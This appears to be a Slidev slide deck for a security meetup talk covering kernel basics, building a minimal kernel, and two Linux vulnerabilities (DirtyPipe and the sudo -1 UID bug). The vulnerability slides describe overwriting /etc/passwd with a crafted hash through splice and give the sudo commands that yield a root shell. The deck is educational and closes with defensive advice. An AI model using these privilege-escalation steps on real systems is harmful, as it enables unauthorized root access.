---
theme: apple-basic
background: https://source.unsplash.com/collection/94734566/1920x1080
class: text-center
highlighter: shiki
lineNumbers: false
info: |
  Talk presented @ Boston Hackers
drawings:
  persist: false
defaults:
  foo: true
transition: slide-left
title: Kernels, Chaos, and Confidentiality
mdc: true
monaco: true
monacoTypesSource: local # or cdn or none
---
# Kernels and Chaos

Lessons in building an OS

<div class="pt-12">
  <span @click="$slidev.nav.next" class="px-2 py-1 rounded cursor-pointer" hover="bg-white bg-opacity-10">
    Let's get started <carbon:arrow-right class="inline"/>
  </span>
</div>


---

### Who is August Radjoe?
&rarr; Intern @ RISC-V, Multiparty.org<br>
&rarr; MS CompSci @ BU <br>
&rarr; Dev @ a few places <br>
&rarr; Open Source @ a few repos, eg. Zephyr

To I.C.E: I am NOT A HACKER! I am just an international student who likes kernels.

Any references to "we", "us", "our", "I" are references to a potential malicious actor or the linux kernel community, and not me.

Website: [securekernels.xyz](https://securekernels.xyz)
Personal website: [abhinavmir.xyz](https://abhinavmir.xyz)

--------------------

### There are many attack surfaces on any kernel
(Linux specific)
Attack surfaces in kernels include:

1. **System Calls**: Bugs can cause privilege escalations or leaks.
2. **Device Drivers**: Vulnerabilities allow arbitrary code execution.
3. **Network Protocols**: Flaws in TCP/IP or Wi-Fi stacks enable remote exploits.
4. **File Systems**: Handling bugs lead to unauthorized access or crashes.
5. **Kernel Modules**: Loaded code with vulnerabilities offers attack entry points.
6. **Buffer Overflows**: Inadequate checks enable kernel memory overwrites.
7. **Race Conditions**: Timing issues cause unintended operation sequences.
8. **Integer Overflows**: Arithmetic mismanagement results in overflows or wrong calculations.
   
---

### Structure of the talk

1. Basics of a kernel
   1.  Kernels vs OS, Privilege separation, Types of kernels, XNU vs Linux, Boot process, Switching between rings, How a Syscall works (an an example to how to dive into reading linux), How does a kernel module, Why can buffer overflows happen
2. How to write a kernel
   1. Writing an image file, Installing GRUB,  Writing a bootloader configuration, Writing a kernel with basic files, threads, basic I/O shell, etc.
3. 2 recent, popular CVEs in the Linux kernel
 Dirtypipes and poor Sudos
4. How do we stop these?

---

# Kernel vs. OS
| Feature        | Kernel           | Operating System  |
| -------------- |:----------------:| :----------------:|
| Definition     | Core component of OS that manages system resources and hardware. | Complete package that includes kernel, UI, and utilities for managing computer resources. |
| Functionality  | Handles low-level tasks like memory management, task scheduling, and device control. | Provides a user interface and a set of applications along with the kernel functionalities. |
| Examples       | Linux kernel, Windows NT kernel. | Linux (Ubuntu, Fedora), Windows, macOS. |

We will focus on talking about kernels, OS increases attack surface, but is too wide in scope for this talk.

(next couple slides, and this one, is inspired from and references [pwn.college's video](https://www.youtube.com/watch?v=j0I2AakUAxk&list=PL-ymxv0nOtqowTpJEW4XTiGQYx6iwa6og))

---

### Encapsulating Privileges

&rarr; A kernel has processes, like individual states (MA, AK, CO etc.), and the kernel itself is like a federal government. <br>
&rarr; There is seperation of privileges, using kernel rings, but they differ in implementations <br>
&rarr; Linux uses ring 0 (kernel mode) and ring 3 (userspace) - which raises the questions what about ring 1 and 2 <br>
&rarr; Well, they're not used as often in modern OSes but there are some that do use all 4 (eg. OS/2)

<center><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Priv_rings.svg/600px-Priv_rings.svg.png" width="350"></center>

---

### No one right solution
1. **Linux/UNIX-like**: Separates user (Ring 3) and kernel (Ring 0) spaces, uses capabilities for access control.
2. **Windows NT**: Kernel operates in Ring 0, user apps in Ring 3, uses UAC for privilege management.
3. **macOS/XNU**: Combines Mach (microkernel) for messaging and BSD for system calls.
4. **Microkernels (Minix 3, L4)**: Minimal privileged kernel, services in user space.
5. **Exokernels**: Allows direct hardware access, resource management via user libraries.
---

### Types of Kernels

1. **Monolithic Kernels**: Large, single address space. Examples: Linux, FreeBSD.
2. **Microkernels**: Minimalist, essential functions only. Examples: Minix, L4.
3. **Hybrid Kernels**: Combines monolithic and microkernel features. Examples: Windows NT, XNU.
4. **Exokernels**: Direct hardware access, minimal abstractions. Examples: MIT's Exokernel.
5. **NanoKernels**: Tiny, focuses on hardware abstraction. Used in embedded systems.

---

### XNU vs GNU Linux

Components of a microkernel-based system include:

1. **Mach Microkernel (Ring 0)**: Manages core services like process, memory, and IPC with message passing.
2. **BSD Component (Ring 0)**: Provides UNIX services, using Mach for file system, POSIX API, and networking.
3. **System Call Interface**: Connects user apps to kernel services, converting POSIX calls to Mach messages.
4. **I/O Kit (User Space)**: A C++ framework for device drivers, using object-oriented principles for safety.
5. **Virtual Memory System**: Uses Mach VM for memory management, featuring protection and demand paging.
6. **Interprocess Communication (IPC)**: Enables message passing for data exchange and synchronization.
7. **Scheduler**: Employs Mach's scheduling for task management and CPU resource allocation.

---

# Much like CTFs, a hacker's goal is switching
# from user land to kernel land, either 
# directly or indirectly.

# And the mitigation tactics
# Are pretty similar to what you would
# do in a defensive CTF team
--- 

### A normal boot process for a kernel

&rarr; The BIOS is not loaded, it stored on a chip in the motherboard <br>
&rarr; When you turn on a computer, it goes through 
POST - power on self test. This generally checks for bootable devices<br>
(floppy, CD, USB, HDD, etc.).  <br>
&rarr; The BIOS then checks for bootable devies for a boot signature that indicates the device is bootable. <br>
&rarr; If a bootable device is found, the BIOS transfers control to the boot loader, initiating the OS startup process. <br>
&rarr; If no bootable device is found, an error message is displayed, prompting for system check or setup. <br>
&rarr; Once the OS starts, the kernel initializes, setting up memory management, device drivers, <br>and system call interfaces for user space applications. <br>
&rarr; The kernel then mounts the root filesystem and starts init (or an equivalent init system) <br>to begin the user space initialization process. <br>
&rarr; Kernel modules can be loaded or unloaded dynamically, providing flexibility in managing hardware drivers <br>and system features. <br>
&rarr; Interrupt Service Routines (ISRs) are part of the kernel, handling hardware interrupts and<br> ensuring responsive system behavior. <br>

---

### How to switch between rings

#### Defining a Syscall
Eg. `read()`


```
SYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count) // 3 for 3 arguments
{
	struct fd f = fdget_pos(fd); // get file descriptor
	ssize_t ret = -EBADF; // default error code

	if (f.file) { // if file descriptor is valid
		loff_t pos = file_pos_read(f.file); // get file position
		ret = vfs_read(f.file, buf, count, &pos); // read from file - virtual file system, buffer means where to read to, count is how many bytes to read, pos is the position to read from
		if (ret >= 0) // if read is successful
			file_pos_write(f.file, pos); // update file position
		fdput_pos(f); // release file descriptor
	}
	return ret; // return read status
}
```

This function in turn opens up `vfs_read()`, which is a virtual file system read function that fails if we have no read persmission, are neither synch or asynch, if the buffer isn't a valid read area. 

---

### Dissecting the syscall()

<center><img src="https://www.usenix.org/legacy/publications/library/proceedings/usenix01/full_papers/kroeger/kroeger_html/linux.caches.gif" width="400"></center>

`vfs_read` is a part of the virutal file system abstraction that provides uniform access to different file systems. It is a part of the kernel that manages file I/O operations, including reading and writing data to and from files. Eventually, it leads to reading from the disk using assembly at some point. 

---

### Visualizing a Syscall

Depending on how you use [KConfig](https://elixir.bootlin.com/linux/v3.14/source/kernel/trace/Kconfig). You can visualize the syscall using `strace` or `ltrace` to see what system calls are being made. 

Note: A file descriptor is an integer that uniquely identifies an open file in a computer's operating system. It is used to access the file for reading, writing, or other operations.

[here](https://stackoverflow.com/a/52457592) is my favourite write-up on it.

eg. Reading a file on ext4

1. Syscall defined in `read_write.c` calls `ksys_read()` which in turn calls `vfs_read()` if all goes well. It then tries to access the `read()` function in the file_operations struct, which depending on the file strucutre is a pointer eventually to the `do_x_read()` type function via the inode. For us it is `ext4_file_read_iter` defined here.

```
const struct file_operations ext4_file_operations = {
	.llseek		= ext4_llseek,
	.read_iter	= ext4_file_read_iter,
	.write_iter	= ext4_file_write_iter,
....
```

---

A couple more jumps in, we reach `filemap_read` which essentially does the following.

  1. **Validation**: Checks if read position exceeds file size or if no data is requested.
  2. **Folio Management**: Uses a `folio_batch` for handling pages (folios) from the page cache.
  3. **Looping Read**:
     - Fetches pages as needed.
     - Copies data from folios to user buffer (`copy_folio_to_iter`).
     - Handles page cache coherency and marks folios accessed.
  4. **Updates**:
     - Updates file access time.
     - Updates read position and last accessed position.

- **Return Values**:
  - Returns the total number of bytes read into the user buffer.
  - Returns an error code (`-EFAULT`, etc.) if the read operation fails at any point.

---

## There are incredible number of validations and abstractions,
## that are in place to ensure that the kernel is secure.
## But malicious actors slip right through them.

---

# So how do You build a minimal kernel?

1. **Create Disk Image:**
```bash
dd if=/dev/zero of=disk.img bs=512 count=60480
```

Do a bunch of configurations you can find [here](https://git.sr.ht/~abhinavmir/OS/tree/main/item/discos/cd.sh).

2. **Install GRUB to `sampleOS`:**
```bash
mkdir /mnt/sampleOS && sudo mount -o loop disk.img /mnt/sampleOS
sudo grub-install --boot-directory=/mnt/sampleOS/boot /dev/loop0
sudo umount /mnt/sampleOS
```

3. **Write Bootloader Configuration:**
- First, create a directory for GRUB config if it doesn't exist:
```bash
sudo mkdir -p /mnt/sampleOS/boot/grub
```

---

- Then, write a simple GRUB configuration to `/mnt/sampleOS/boot/grub/grub.cfg`:
```bash
menuentry "Experimental OS" {
    set root=(hd0)
    linux /boot/vmlinuz root=/dev/sda1 ro quiet
    initrd /boot/initrd.img
}
```
Then write your minimal kernel that starts by printing `hello world` to the screen.

```
volatile char *video_memory = (volatile char*)0xB8000; // Video memory starts here.

void print(const char *str) {
    while (*str != 0) {
        *video_memory++ = *str++; // Character byte
        *video_memory++ = 0x07;   // Attribute byte (light grey on black)
    }
}

void main() {
    print("Hello, World!");
    while(1) {} // Loop indefinitely to prevent the kernel from exiting.
}
```
--- 

Compile it, say for i686-elf, and then run it on the VM.

`i686-elf-gcc -ffreestanding -c kernel.c -o kernel.o && i686-elf-ld -o kernel.bin -Ttext 0x1000 kernel.o --oformat binary`

And now you can run it with QEMU.

`qemu-system-i386 -kernel kernel.bin`

It's been 2 months since I wrote my first kernel, and I don't really remember the exact steps, so you'll need to reference the [OSDev Wiki](https://wiki.osdev.org/Main_Page) and other resources to get it all right, but these are the general steps.

There are other ways to learn how OSes work -
1. Build Linux kernel from scratch (I have an instructional [here](https://abhinavmir.xyz/blog/linux-kernel/))
2. Write a basic kernel module, I'll be posting instructionals on that [here](https://xernel.site/posts/2-first-kernel-module/).
3. Write simple bootloaders
4. Play around with RTOSes on cheap ESP32s
5. Build a small 8-bit CPU on LogiSim

etc.


---

# DirtyPipe

&rarr; RAM is main memory, and is volatile, meaning it loses data when the power is turned off. <br>
&rarr; Hard drive is secondary memory, and is non-volatile, meaning it retains data when the power is turned off. <br>
&rarr; Virtual Memory is a memory management technique that provides an "idealized abstraction of the <br> storage resources that are actually available on a given machine" which "creates the illusion to users of a very large (main) memory." <br>
&rarr; A Translation Lookaside Buffer (TLB) is a cache used by a computer's CPU to reduce the time taken to access memory locations in the virtual memory. It stores recent translations of virtual memory addresses to physical memory addresses, improving the speed of memory access in an operating system. <br>
&rarr; A page is a fixed-length contiguous block of virtual memory, described by a single entry in the page table. It is the smallest unit of data for memory management in a virtual memory system.  <br>
&rarr; A dirty page is a page in memory that has been modified since it was last written to disk. It is marked as "dirty" to indicate that it needs to be written back to disk to maintain consistency between memory and storage. <br>
&rarr; You have this in databases, and other complex systems, but also just not saving your file but writing to it for example, is a primitive form of this.

--- 

### Understanding Pipes

`ls | grep "foo"` is a pipe. It takes the output of `ls` and feeds it into `grep`. There are named and unnamed pipes, we have used an unnamed pipe here - an anonymous pipe. We pass the input of the first process `ls` into the second process `grep` and look through the results of the first process via `grep`.

In commit [f6..58](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=f6dd975583bd8ce088400648fd9819e4691c8958), the aim was to simplify buffer operation management. So we removed `anon_pipe_buf_nomerge_ops` and `packet_pipe_buf_ops` and `pipe_buf_mark_unmergeable()`, but we added `PIPE_BUF_FLAG_CAN_MERGE`, which was used to indicate whether new data written to a pipe can be merged with an existing buffer. We modified other functions to now work with this, but this caused a problem.

---

### The problem 

`splice()` is one of the syscalls (we studied this earlier) which moves data between a fildes and a pipe. It doesn't touch user land, and is generally faster. 

Suppose you have a file named `source_file.txt` and you want to send its contents over a network socket. This is how you'd do it in C

```
file_fd = filedes of source_file.txt
socket_fd = filedes of the socket


int pipe_fds[2];
pipe(pipe_fds); // Create a pipe


// Splice the file to the pipe: move data from file_fd to pipe_fds[1]
splice(file_fd, NULL, pipe_fds[1], NULL, 1024, SPLICE_F_MOVE);


// Splice the pipe to the socket: move data from pipe_fds[0] to socket_fd
splice(pipe_fds[0], NULL, socket_fd, NULL, 1024, SPLICE_F_MOVE);
```
---

Editing `/etc/passwd` is a common example of a dirty pipe. 

The simplest hack using Dirty Pipe is placing our malicious password hash in `/etc/passwd`.


We set offset to 4, basically after the first `root` entry.

Construct the payload using `openssl passwd -1 -salt name`, which comes out as `$1$name$e2....m01`. 

We then make a bunch of checks - make sure everything looks good.

Now, we prepare a pipe by inserting it completely with data thus forcing the can_merge flag to be set, and then we flush it but keep the flags.

Now, we open `/etc/passwd` in `READ_ONLY` mode, and then we call `splice()` to move the data from the pipe to the file.

Since [copy_page_to_iter_pipe()](https://elixir.bootlin.com/linux/v5.9/source/lib/iov_iter.c#L369) doesn't initalialize the `PIPE_BUF_FLAG_CAN_MERGE` flag, we can write to the file.

```
ssize_t splice(int fd_in, off_t *_Nullable off_in, int fd_out, off_t *_Nullable off_out, size_t len, unsigned int flags);
```

Finally, we restore the password file to its original state, gain access into shell rather discreetly, and go on hacking :).


---

```
static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t bytes,
			 struct iov_iter *i)
{
	struct pipe_inode_info *pipe = i->pipe;
	struct pipe_buffer *buf;
......
	buf->ops = &page_cache_pipe_buf_ops;
	get_page(page);
	buf->page = page;
	buf->offset = offset;
	buf->len = bytes;
  // Missing PIPE_BUF_FLAG_CAN_MERGE initialization flag? Carries over from the pipe.

	pipe->head = i_head + 1;
	i->iov_offset = offset + bytes;
	i->head = i_head;
out:
	i->count -= bytes;
	return bytes;
}
```


---

### Attacks don't have to be so serious
# They definitely don't have to be so embedded

Discussing CVE-2019-14287

---

"When sudo is configured to allow a user to run commands as an arbitrary user via the ALL keyword in a Runas specification, it is possible to run commands as root by specifying the user ID -1 or 4294967295."
- [sudo.ws](https://www.sudo.ws/security/advisories/minus_1_uid/)

---

```
sudo -V # If <1.8.28, you're vulnerable
```


```
visudo
```

```
# User privilege specification
temp ALL=(ALL:ALL) ALL
```

So now when you do `su - temp`, you can run `sudo -u#-1 /bin/bash` and you're in root. But, if you don't want to give temp root access, what you do is
---

```
# User privilege specification
temp ALL=(ALL, !root) ALL
```

Technically, this shouldn't allow `temp` to run `root` commands, but with the vulnerability, you can still run `sudo -u#-1 /bin/bash` and you're in root. You can also run `sudo -u#4294967295 /bin/bash` and you're in root.

I tried to reflog through `sudo`'s source code, but 1) it's on mercurial, and 2) each release has a million commits, so I wasn't able to find out what they fixed, but a safe bet is that they just disallowed negative numbers and going over the max int ($2^32$ − 1 = 4294967295).



---

# How to solve this?
### General, usualy advice
1. Don't increase your attack surface - eg. snaps, flatpaks, etc.
2. Keep your kernel and packages up to date (eg. with `sudo apt update && sudo apt upgrade`)
3. Do not run untrusted code (attack vector via "interviews", cracked piracy software, etc.)
4. Use a firewall, eg. `ufw` or `firewalld`.

---

### Kernel specific advice
1. I am not the right person for this but there are many tools
2. Use `kconfig` to offload secure, but slow modules.
3. Use CPA-Checker type kernel verification tools.
4. Use eBPFS to play around with features without compromising security (which could be its own 60-minute talk).

---

### The kernel patching process in long
- **Design**: Define patch requirements and implementation strategies, preferably in an open forum.
- **Early review**: Submit patches to relevant mailing lists for initial feedback.
- **Wider review**: Obtain acceptance from subsystem maintainers, leading to more thorough scrutiny.
- **Merging into the mainline**: Successful patches are merged into the mainline repository managed by Linus Torvalds.
- **Stable release**: Potential issues may surface as the patch affects a larger user base.
- **Long-term maintenance**: Original developer or community continues to maintain the code for its lifespan.

---

1. Take part in the community, raise your bugs and contribute to them (https://bugzilla.kernel.org/query.cgi?format=advanced).
2. Keep an eye out on the [Linux Kernel Mailing List](https://lkml.org/).
3. Read many different news sources on the kernel, eg. [LWN](https://lwn.net/).
4. Papers from Arxiv are a great way to see what's happening in the kernel world.
5. Follow kernel developers on Twitter, eg. [Greg Kroah-Hartman](https://twitter.com/gregkh).

---

### References

1. https://pwn.college/system-security/kernel-security
2. https://lwn.net/Articles/604287/
3. https://lwn.net/Articles/604287/
4. https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=f6dd975583bd8ce088400648fd9819e4691c8958
